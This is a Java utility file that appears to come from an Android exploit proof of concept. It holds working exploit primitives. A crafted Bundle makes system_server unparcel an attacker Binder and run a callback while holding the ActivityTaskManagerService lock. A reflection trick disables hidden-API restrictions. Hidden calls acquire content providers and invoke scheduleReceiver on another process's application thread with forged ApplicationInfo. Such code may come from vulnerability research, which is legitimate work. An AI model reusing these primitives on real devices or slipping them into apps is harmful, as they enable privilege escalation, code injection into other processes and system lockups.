package com.example.leakvalue;

import android.app.ActivityManager;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.os.RemoteException;
import android.util.Log;
import android.util.Property;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.lang.reflect.Method;
import java.time.Duration;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.ArrayList;
import java.util.function.Consumer;

public class MiscUtils {
    /**
     * Execute provided callback with ActivityTaskManagerService lock held
     * <p>
     * (provided callback may call into ActivityTaskManagerService
     * because Java's 'synchronized' is reentrant,
     * but everyone else can't and will be blocked until callback returns)
     */
    static void withLockedActivityTaskManager(ActivityManager activityManager, Runnable callback) {
        int[] runCount = new int[3];

        Parcel data = Parcel.obtain();
        int bundleLenPos = data.dataPosition();
        data.writeInt(0);
        data.writeInt(0x4C444E42); // BUNDLE_MAGIC
        int bundleStart = data.dataPosition();

        data.writeInt(1); // Number of key-value pairs in Bundle
        data.writeString("android:activity.launchBounds");
        data.writeInt(4); // VAL_PARCELABLE
        int lazyValueLenPos = data.dataPosition();
        data.writeInt(0);
        int lazyValueStart = data.dataPosition();
        data.writeString("android.content.pm.ParceledListSlice");
        data.writeInt(1); // Number of elements in ParceledListSlice
        data.writeString("android.content.ComponentName");
        data.writeInt(0); // End of inline elements
        data.writeStrongBinder(new Binder() {
            @Override
            protected boolean onTransact(int code, @NonNull Parcel data, @Nullable Parcel reply, int flags) throws RemoteException {
                if (code == FIRST_CALL_TRANSACTION) {
                    reply.writeInt(1);
                    reply.writeString("");
                    reply.writeString("");
                    int prevCount = runCount[0]++;
                    if (prevCount == 0) {
                        try {
                            callback.run();
                        } catch (Exception e) {
                            Log.e("MiscUtils", "Callback has crashed", e);
                            runCount[2] = 1;
                        }
                    }
                    runCount[1]++;
                    return true;
                }
                return super.onTransact(code, data, reply, flags);
            }
        });

        backpatchLength(data, lazyValueLenPos, lazyValueStart);
        backpatchLength(data, bundleLenPos, bundleStart);
        data.setDataPosition(0);
        Bundle options = data.readBundle();
        data.recycle();

        activityManager.moveTaskToFront(0, 0, options);

        if (runCount[0] == 0) {
            throw new RuntimeException("Callback was not called");
        }
        if (runCount[0] != 1 || runCount[1] != 1 || runCount[2] != 0) {
            throw new RuntimeException("Callback has crashed");
        }
    }

    private static void backpatchLength(Parcel parcel, int lengthPos, int startPos) {
        int endPos = parcel.dataPosition();
        parcel.setDataPosition(lengthPos);
        parcel.writeInt(endPos - startPos);
        parcel.setDataPosition(endPos);
    }

    public static int myUserId() {
        return Process.myUid() / 100000;
    }

    private static final ArrayList<Runnable> sAsyncProviderCleaners = new ArrayList<>();

    private static Instant sReleaseAsyncProvidersReleaseDoneTime;

    static void releaseAsyncProviders() {
        if (!sAsyncProviderCleaners.isEmpty()) {
            for (Runnable runnable : sAsyncProviderCleaners) {
                runnable.run();
            }
            sAsyncProviderCleaners.clear();
            sReleaseAsyncProvidersReleaseDoneTime = Instant.now().plus(6, ChronoUnit.SECONDS);
        }
    }

    static void waitForReleaseAsyncProviders(Consumer<String> log) throws InterruptedException {
        Instant doneTime = sReleaseAsyncProvidersReleaseDoneTime;
        if (doneTime != null) {
            long duration = Duration.between(Instant.now(), doneTime).toMillis();
            if (duration > 0) {
                log.accept("Waiting for Content Provider release");
                Thread.sleep(duration);
                log.accept("Done waiting");
            }
        }
    }

    static void acquireContentProviderAsync(Context context, String targetProviderAuthority) throws ReflectiveOperationException {
        Context baseContext = context;
        while (baseContext instanceof ContextWrapper) {
            baseContext = ((ContextWrapper) baseContext).getBaseContext();
        }

        Object applicationThread = baseContext.getClass().getMethod("getIApplicationThread").invoke(baseContext);

        Object amService = ActivityManager.class.getMethod("getService").invoke(null);
        Object holder = amService
                .getClass()
                .getMethod(
                        "getContentProvider",
                        Class.forName("android.app.IApplicationThread"),
                        String.class,
                        String.class,
                        int.class,
                        boolean.class
                ).invoke(
                        amService,
                        applicationThread,
                        context.getPackageName(),
                        targetProviderAuthority,
                        myUserId(),
                        true
                );

        sAsyncProviderCleaners.add(() -> {
            try {
                amService
                        .getClass()
                        .getMethod(
                                "removeContentProvider",
                                IBinder.class,
                                boolean.class
                        ).invoke(
                                amService,
                                holder.getClass().getField("connection").get(holder),
                                true
                        );
            } catch (ReflectiveOperationException e) {
                e.printStackTrace();
            }
        });
    }

    static void callScheduleReceiver(IBinder binder, String myPackageName, String mySourceDir, Intent intent) throws ReflectiveOperationException {
        ApplicationInfo applicationInfo = new ApplicationInfo();
        applicationInfo.packageName = myPackageName;
        applicationInfo.sourceDir = mySourceDir;
        applicationInfo.nativeLibraryDir = ".";
        applicationInfo.dataDir = ".";
        applicationInfo.flags = ApplicationInfo.FLAG_HAS_CODE;
        ActivityInfo activityInfo = new ActivityInfo();
        activityInfo.applicationInfo = applicationInfo;
        activityInfo.name = intent.getComponent().getClassName();

        Object appThread = Class.forName("android.app.IApplicationThread$Stub")
                .getMethod("asInterface", IBinder.class)
                .invoke(null, binder);

        appThread
                .getClass()
                .getMethod(
                        "scheduleReceiver",
                        Intent.class,
                        ActivityInfo.class,
                        Class.forName("android.content.res.CompatibilityInfo"),
                        int.class,
                        String.class,
                        Bundle.class,
                        boolean.class,
                        int.class,
                        int.class
                )
                .invoke(
                        appThread,
                        intent,
                        activityInfo,
                        null,
                        0,
                        null,
                        null,
                        false,
                        0,
                        0
                );
    }

    static void putBinderExtra(Intent intent, String key, IBinder binder) {
        Bundle bundle = new Bundle();
        bundle.putBinder(key, binder);
        intent.putExtras(bundle);
    }

    private static boolean sAllowHiddenApisDone;

    public static void allowHiddenApis() {
        if (sAllowHiddenApisDone) return;
        try {
            Method[] methods = Property.of(Class.class, Method[].class, "Methods").get(Class.forName("dalvik.system.VMRuntime"));
            Method setHiddenApiExemptions = null;
            Method getRuntime = null;
            for (Method method : methods) {
                if ("setHiddenApiExemptions".equals(method.getName())) {
                    setHiddenApiExemptions = method;
                }
                if ("getRuntime".equals(method.getName())) {
                    getRuntime = method;
                }
            }
            setHiddenApiExemptions.invoke(getRuntime.invoke(null), new Object[]{new String[]{"L"}});
        } catch (ReflectiveOperationException e) {
            throw new RuntimeException(e);
        }
        sAllowHiddenApisDone = true;
    }
}
